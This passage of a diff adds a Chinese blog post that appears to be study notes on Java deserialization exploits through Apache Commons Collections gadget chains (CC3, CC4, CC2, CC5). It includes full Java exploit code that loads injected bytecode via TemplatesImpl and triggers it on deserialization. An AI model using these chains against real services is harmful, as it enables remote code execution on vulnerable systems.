class="hljs-string">&quot;test&quot;</span>);<br>     <span class="hljs-type">Field</span> <span class="hljs-variable">_tfField</span> <span class="hljs-operator">=</span> tc.getDeclaredField(<span class="hljs-string">&quot;_tfactory&quot;</span>);<br>     _tfField.setAccessible(<span class="hljs-literal">true</span>);<br>     _tfField.set(templates, <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerFactoryImpl</span>());<br>     templates.newTransformer();<br></code></pre></td></tr></table></figure>
+
+<p>‍</p>
+<p>这里有个要注意的点</p>
+<ul>
+<li>455行会去进行强制类型转换为<code>AbstractTranslet</code>​类，那我们是不是要传该类进来呢？</li>
+</ul>
+<p>​<img src="/assets/image-20231210110613-ank6knr.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
+<p>​<img src="/assets/image-20231210110635-gttb2vc.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
+<p>在这个地方他会去判断这个父类是否为 <code>com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet</code>​</p>
+<p>所以加载的字节码文件要是集成了<code>com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet</code>​这个的类</p>
+<ul>
+<li>这里<code> _bytecodes</code>​ 不能为空</li>
+</ul>
+<p>​<img src="/assets/image-20231130110651-12995pu.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
+<p>‍</p>
+<p>​<img src="/assets/image-20231130110746-4gdp5ha.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
+<p>‍</p>
+<p>那么后半段执行代码的点就可以修改了，其实跟CC1基本都不变，只是修改了一下执行代码的形式，</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs java"><br><span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br><span class="hljs-type">Class</span> <span class="hljs-variable">tc</span> <span class="hljs-operator">=</span>  templates.getClass();<br><span class="hljs-type">Field</span> <span class="hljs-variable">bytecodesField</span> <span class="hljs-operator">=</span> tc.getDeclaredField(<span class="hljs-string">&quot;_bytecodes&quot;</span>);<br>bytecodesField.setAccessible(<span class="hljs-literal">true</span>);<br><span class="hljs-type">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="hljs-string">&quot;E:\\Java_project\\Serialization_Learing\\target\\classes\\Test.class&quot;</span>));<br><span class="hljs-type">byte</span>[][] codes = &#123;code&#125;;<br>bytecodesField.set(templates, codes);<br><span class="hljs-type">Field</span> <span class="hljs-variable">nameField</span> <span class="hljs-operator">=</span> tc.getDeclaredField(<span class="hljs-string">&quot;_name&quot;</span>);<br>nameField.setAccessible(<span class="hljs-literal">true</span>);<br>nameField.set(templates, <span class="hljs-string">&quot;test&quot;</span>);<br><span class="hljs-type">Field</span> <span class="hljs-variable">_tfField</span> <span class="hljs-operator">=</span> tc.getDeclaredField(<span class="hljs-string">&quot;_tfactory&quot;</span>);<br>_tfField.setAccessible(<span class="hljs-literal">true</span>);<br>_tfField.set(templates, <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerFactoryImpl</span>());<br>  <br>Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;<br>        <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(templates),<br>        <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;newTransformer&quot;</span>, <span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>)&#125;;<br><br><span class="hljs-type">ChainedTransformer</span> <span class="hljs-variable">chainedTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers);<br>HashMap&lt;Object, Object&gt; map = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>Map&lt;Object,Object&gt; lazyMap = LazyMap.decorate(map,chainedTransformer);<br><br><span class="hljs-type">Class</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span>  Class.forName(<span class="hljs-string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);<br><span class="hljs-type">Constructor</span> <span class="hljs-variable">cls</span>  <span class="hljs-operator">=</span>  c.getDeclaredConstructor(Class.class,Map.class);<br>cls.setAccessible(<span class="hljs-literal">true</span>);<br><span class="hljs-type">InvocationHandler</span> <span class="hljs-variable">h</span> <span class="hljs-operator">=</span> (InvocationHandler) cls.newInstance(Override.class,lazyMap);<br><br><span class="hljs-type">Map</span> <span class="hljs-variable">maproxy</span> <span class="hljs-operator">=</span> (Map) Proxy.newProxyInstance(LazyMap.class.getClassLoader(),<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Map.class&#125;,h);<br><br><span class="hljs-type">Object</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> cls.newInstance(Override.class,maproxy);<br><br>serialize(o);<br>unserialize(<span class="hljs-string">&quot;ser.bin&quot;</span>);<br></code></pre></td></tr></table></figure>
+
+<p>‍</p>
+<p>上述其实是去找谁去调用了<code>newTransformer()</code>​导致可以连接上动态类加载的<code>TemplatesImpl</code>​链，所以想到了<code>InvokerTransformer</code>​当中的类似反射的代码来完成调用但是如果<code>InvokerTransformer</code>​被ban了，才到真正的CC3 ，因为是绕过了<code>InvokerTransformer</code>​的限制，采用了另一条链子</p>
+<p>‍</p>
+<p>作者继续往上跟看谁调用了<code>newTransformer()</code>​，于是找到了<code>com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter.java</code>​</p>
+<p>​<img src="/assets/image-20231210114017-83r980f.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
+<p>​<code>TrAXFilter</code>​这个类是直接传入Templates类后调用的构造方法就调用了<code>newTransformer()</code>​方法，也就是说只要找到一个地方可以调用<code>TrAXFilter</code>​他的构造方法 ，就可以成功连接上动态类加载的后半条链子了</p>
+<p>‍</p>
+<p>于是作者找到了<code>\commons-collections-3.2.1.jar!\org\apache\commons\collections\functors\InstantiateTransformer.java</code>​</p>
+<p>看一下他的<code>transform</code>​方法</p>
+<p>​<img src="/assets/image-20231210114454-2k1wwts.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
+<p>那么我们就可以根据其构造方法去构造，然后通过之前的办法去调用其<code>transform</code>​即可全部连接起来</p>
+<p>‍</p>
+<p>​<img src="/assets/image-20231210114611-o6kid7x.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
+<p>‍</p>
+<p>写出以下demo</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br><span class="hljs-type">Class</span> <span class="hljs-variable">tc</span> <span class="hljs-operator">=</span>  templates.getClass();<br><span class="hljs-type">Field</span> <span class="hljs-variable">bytecodesField</span> <span class="hljs-operator">=</span> tc.getDeclaredField(<span class="hljs-string">&quot;_bytecodes&quot;</span>);<br>bytecodesField.setAccessible(<span class="hljs-literal">true</span>);<br><span class="hljs-type">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="hljs-string">&quot;E:\\Java_project\\Serialization_Learing\\target\\classes\\Test.class&quot;</span>));<br><span class="hljs-type">byte</span>[][] codes = &#123;code&#125;;<br>bytecodesField.set(templates, codes);<br><span class="hljs-type">Field</span> <span class="hljs-variable">nameField</span> <span class="hljs-operator">=</span> tc.getDeclaredField(<span class="hljs-string">&quot;_name&quot;</span>);<br>nameField.setAccessible(<span class="hljs-literal">true</span>);<br>nameField.set(templates, <span class="hljs-string">&quot;test&quot;</span>);<br><span class="hljs-type">Field</span> <span class="hljs-variable">_tfField</span> <span class="hljs-operator">=</span> tc.getDeclaredField(<span class="hljs-string">&quot;_tfactory&quot;</span>);<br>_tfField.setAccessible(<span class="hljs-literal">true</span>);<br>_tfField.set(templates, <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerFactoryImpl</span>());<br><br><span class="hljs-type">InstantiateTransformer</span> <span class="hljs-variable">instantiateTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InstantiateTransformer</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Templates.class&#125;,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;templates&#125;);<br>instantiateTransformer.transform(TrAXFilter.class);<br></code></pre></td></tr></table></figure>
+
+<p>这样其实就可以调用<code>TrAXFilter</code>​的构造方法了，那么现在就是去整条链子串起来即可</p>
+<p>最后exp</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">tc</span> <span class="hljs-operator">=</span>  templates.getClass();<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">bytecodesField</span> <span class="hljs-operator">=</span> tc.getDeclaredField(<span class="hljs-string">&quot;_bytecodes&quot;</span>);<br>        bytecodesField.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-type">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="hljs-string">&quot;E:\\Java_project\\Serialization_Learing\\target\\classes\\Test.class&quot;</span>));<br>        <span class="hljs-type">byte</span>[][] codes = &#123;code&#125;;<br>        bytecodesField.set(templates, codes);<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">nameField</span> <span class="hljs-operator">=</span> tc.getDeclaredField(<span class="hljs-string">&quot;_name&quot;</span>);<br>        nameField.setAccessible(<span class="hljs-literal">true</span>);<br>        nameField.set(templates, <span class="hljs-string">&quot;test&quot;</span>);<br><br>        <span class="hljs-type">InstantiateTransformer</span> <span class="hljs-variable">instantiateTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InstantiateTransformer</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Templates.class&#125;,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;templates&#125;);<br><br>        Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(TrAXFilter.class),<br>                instantiateTransformer<br>                &#125;;<br><br>        <span class="hljs-type">ChainedTransformer</span> <span class="hljs-variable">chainedTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers);<br>        HashMap&lt;Object, Object&gt; map = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        Map&lt;Object,Object&gt; lazyMap = LazyMap.decorate(map,chainedTransformer);<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span>  Class.forName(<span class="hljs-string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);<br>        <span class="hljs-type">Constructor</span> <span class="hljs-variable">cls</span>  <span class="hljs-operator">=</span>  c.getDeclaredConstructor(Class.class,Map.class);<br>        cls.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-type">InvocationHandler</span> <span class="hljs-variable">h</span> <span class="hljs-operator">=</span> (InvocationHandler) cls.newInstance(Override.class,lazyMap);<br>        <span class="hljs-type">Map</span> <span class="hljs-variable">maproxy</span> <span class="hljs-operator">=</span> (Map) Proxy.newProxyInstance(LazyMap.class.getClassLoader(),<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Map.class&#125;,h);<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> cls.newInstance(Override.class,maproxy);<br></code></pre></td></tr></table></figure>
+
+<p>其实就是利用了<code>InstantiateTransformer</code>​可以执行构造方法拼接了一下后续的动态类加载这样的思路</p>
+<p>​<img src="/assets/image-20231210120630-h8k4wdb.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
+<p>‍</p>
+<p>‍</p>
+<p>‍</p>
+<h1 id="CC4"><a href="#CC4" class="headerlink" title="CC4"></a>CC4</h1><p>从CC4开始就要换依赖了</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependencies</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>commons-collections<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>commons-collections<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>3.2.1<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.apache.commons<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>commons-collections4<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>4.0<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependencies</span>&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p>‍</p>
+<h3 id="​TransformingComparator-compare-​​​"><a href="#​TransformingComparator-compare-​​​" class="headerlink" title="​TransformingComparator#compare()​​​"></a>​<code>TransformingComparator#compare()</code>​​​</h3><p>其实在CC4中也是没有变化太多，而是新引入了一个CC4的包，跟原来CC1的包进行了拼接，那么作者其实是在CC4的包中去寻找调用<code>transform</code>​方法的类，在</p>
+<p>​<code>commons-collections4-4.0.jar!\org\apache\commons\collections4\comparators\TransformingComparator#compare()</code>​中找到了调用<code>transform</code>​方法</p>
+<p>​<img src="/assets/image-20231211104406-12z790g.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
+<p>这里也是说的很模糊，反正就是看谁去调用了这个<code>compare</code>​方法，于是找到了</p>
+<p>‍</p>
+<h3 id="​PriorityQueue-siftDownUsingComparator-​​​"><a href="#​PriorityQueue-siftDownUsingComparator-​​​" class="headerlink" title="​PriorityQueue#siftDownUsingComparator()​​​"></a>​<code>PriorityQueue#siftDownUsingComparator()</code>​​​</h3><p>​<code>jdk1.8.0_65\src.zip!\java\util\PriorityQueue#siftDownUsingComparator()</code>​调用了<code>compare</code>​方法</p>
+<p>‍</p>
+<p>​<img src="/assets/image-20231211104737-lmpytmd.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
+<p>‍</p>
+<p>再往上跟就是谁去调用了<code>siftDownUsingComparator</code>​ ，找到的是  <code>jdk1.8.0_65\src.zip!\java\util\PriorityQueue#siftDown</code>​</p>
+<p>‍</p>
+<p>​<img src="/assets/image-20231211104810-yjrfh9l.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
+<p>‍</p>
+<p>继续往上跟 找到的是 <code>jdk1.8.0_65\src.zip!\java\util\PriorityQueue#heapify()</code>​</p>
+<p>‍</p>
+<p>​<img src="/assets/image-20231211104903-h7qjh11.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
+<h3 id="​PriorityQueue-readObject-​​​"><a href="#​PriorityQueue-readObject-​​​" class="headerlink" title="​PriorityQueue#readObject()​​​"></a>​<code>PriorityQueue#readObject()</code>​​​</h3><p>继续往上跟 就是<code>jdk1.8.0_65\src.zip!\java\util\PriorityQueue#readObject()</code>​</p>
+<p>​<img src="/assets/image-20231211104934-mi54ksd.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
+<p>‍</p>
+<p>至此就跟到<code>readObject</code>​结束了，所以只需要一个入口类去触发这个<code>readObject</code>​方法即可传入，那么接下里就是构造EXP了</p>
+<p>‍</p>
+<p>这里有几个要注意的点</p>
+<ul>
+<li>这里的<code>site</code>​必须为两个否则进不去这个<code>siftDown</code>​方法中</li>
+</ul>
+<p>​<img src="/assets/image-20231211112214-h1ppn9r.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
+<p>‍</p>
+<ul>
+<li>其实他在<code>add</code>​方法的时候也会去调用<code>compare</code>​方法，所以跟URLDNS或者CC3一样都要去反射把值修改一下</li>
+</ul>
+<p>‍</p>
+<ul>
+<li>CC4跟CC3的包其实更新了一个版本后在<code>TransformingComparator</code>​中是有改变的，在CC4中这个类继承了<code>Serializable</code>​接口导致可以序列化</li>
+</ul>
+<p>​<img src="/assets/image-20231211110610-6hbkbmd.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
+<p>而在CC3中是并没有进行序列化的继承的</p>
+<p>​<img src="/assets/image-20231211110710-bxa3plt.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
+<p>最后的EXP</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">tc</span> <span class="hljs-operator">=</span>  templates.getClass();<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">bytecodesField</span> <span class="hljs-operator">=</span> tc.getDeclaredField(<span class="hljs-string">&quot;_bytecodes&quot;</span>);<br>        bytecodesField.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-type">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="hljs-string">&quot;E:\\Java_project\\Serialization_Learing\\target\\classes\\Test.class&quot;</span>));<br>        <span class="hljs-type">byte</span>[][] codes = &#123;code&#125;;<br>        bytecodesField.set(templates, codes);<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">nameField</span> <span class="hljs-operator">=</span> tc.getDeclaredField(<span class="hljs-string">&quot;_name&quot;</span>);<br>        nameField.setAccessible(<span class="hljs-literal">true</span>);<br>        nameField.set(templates, <span class="hljs-string">&quot;test&quot;</span>);<br><br>        <span class="hljs-type">InstantiateTransformer</span> <span class="hljs-variable">instantiateTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InstantiateTransformer</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Templates.class&#125;,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;templates&#125;);<br><br>        Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(TrAXFilter.class),<br>                instantiateTransformer<br>        &#125;;<br><br>        <span class="hljs-type">ChainedTransformer</span> <span class="hljs-variable">chainedTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers);<br><br><br>        <span class="hljs-type">TransformingComparator</span> <span class="hljs-variable">transformingComparator</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformingComparator</span>&lt;&gt;(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>&lt;&gt;(<span class="hljs-number">1</span>));<br>        <span class="hljs-type">PriorityQueue</span> <span class="hljs-variable">priorityQueue</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">PriorityQueue</span>(transformingComparator);<br><br>        priorityQueue.add(templates);<br>        priorityQueue.add(<span class="hljs-number">2</span>);<br><br>        <span class="hljs-type">Class</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> transformingComparator.getClass();<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">transformingComparatorfield</span> <span class="hljs-operator">=</span>  c.getDeclaredField(<span class="hljs-string">&quot;transformer&quot;</span>);<br>        transformingComparatorfield.setAccessible(<span class="hljs-literal">true</span>);<br>        transformingComparatorfield.set(transformingComparator,chainedTransformer);<br><br>        serialize(priorityQueue);<br>        unserialize(<span class="hljs-string">&quot;ser.bin&quot;</span>);<br></code></pre></td></tr></table></figure>
+
+<p>‍</p>
+<h1 id="CC2"><a href="#CC2" class="headerlink" title="CC2"></a>CC2</h1><p>一样要依赖于CC4 这里跳了一下直接走了<code>TemplatesImpl#newTransformer()</code>​去动态加载类</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">tc</span> <span class="hljs-operator">=</span>  templates.getClass();<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">bytecodesField</span> <span class="hljs-operator">=</span> tc.getDeclaredField(<span class="hljs-string">&quot;_bytecodes&quot;</span>);<br>        bytecodesField.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-type">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="hljs-string">&quot;E:\\Java_project\\Serialization_Learing\\target\\classes\\Test.class&quot;</span>));<br>        <span class="hljs-type">byte</span>[][] codes = &#123;code&#125;;<br>        bytecodesField.set(templates, codes);<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">nameField</span> <span class="hljs-operator">=</span> tc.getDeclaredField(<span class="hljs-string">&quot;_name&quot;</span>);<br>        nameField.setAccessible(<span class="hljs-literal">true</span>);<br>        nameField.set(templates, <span class="hljs-string">&quot;test&quot;</span>);<br><br>        <span class="hljs-type">InstantiateTransformer</span> <span class="hljs-variable">instantiateTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InstantiateTransformer</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Templates.class&#125;,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;templates&#125;);<br><br><br>        InvokerTransformer&lt;Object,Object&gt; invokerTransformer = <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>&lt;&gt;(<span class="hljs-string">&quot;newTransformer&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;&#125;);<br>    <br>        <span class="hljs-type">TransformingComparator</span> <span class="hljs-variable">transformingComparator</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformingComparator</span>&lt;&gt;(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>&lt;&gt;(<span class="hljs-number">1</span>));<br>        <span class="hljs-type">PriorityQueue</span> <span class="hljs-variable">priorityQueue</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">PriorityQueue</span>(transformingComparator);<br><br>        priorityQueue.add(templates);<br>        priorityQueue.add(<span class="hljs-number">2</span>);<br><br>        <span class="hljs-type">Class</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> transformingComparator.getClass();<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">transformingComparatorfield</span> <span class="hljs-operator">=</span>  c.getDeclaredField(<span class="hljs-string">&quot;transformer&quot;</span>);<br>        transformingComparatorfield.setAccessible(<span class="hljs-literal">true</span>);<br>        transformingComparatorfield.set(transformingComparator,invokerTransformer);<br><br>        serialize(priorityQueue);<br>        unserialize(<span class="hljs-string">&quot;ser.bin&quot;</span>);<br></code></pre></td></tr></table></figure>
+
+<p>‍</p>
+<h1 id="CC5"><a href="#CC5" class="headerlink" title="CC5"></a>CC5</h1><p>CC5其实也是一种排列组合，就是作者在<code>TiedMapEntry</code>​中还找到了<code>toString</code>​方法也可以调用<code>LazyMap#get()</code>​</p>
+<p>​<img src="/assets/image-20231211121652-pr3huzv.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
+<p>都是一样的</p>
+<p>所以去找了一下谁去调用了<code>toString</code>​方法 找到了<code>\src.zip!\javax\management\BadAttributeValueExpException.java</code>​</p>
+<p>​<img src="/assets/image-20231211121753-4jhdngo.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
+<p>那么也是拼接到<code>LazyMap#get()</code>​就好了</p>
+<p>由于这里组长并没有给出EXP，在自己有一定的理解情况下补充一下</p>
+<p>‍</p>
+<p>一开始我打算直接加入这一行代码就可以完成逻辑了</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">BadAttributeValueExpException</span> <span class="hljs-variable">badAttributeValueExpException</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BadAttributeValueExpException</span>(tiedMapEntry);<br></code></pre></td></tr></table></figure>
+
+<p>但是发现并没有成功，所以继续断点看看</p>
+<p>​<img src="/assets/image-20231211144700-vlhuj64.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
+<p>发现这个<code>valObj</code>​是String型的，所以得要用反射去把这个值修改为<code>TiedMapEntry#ToString</code>​即可</p>
+<p>‍</p>
+<p>最后修改为</p>
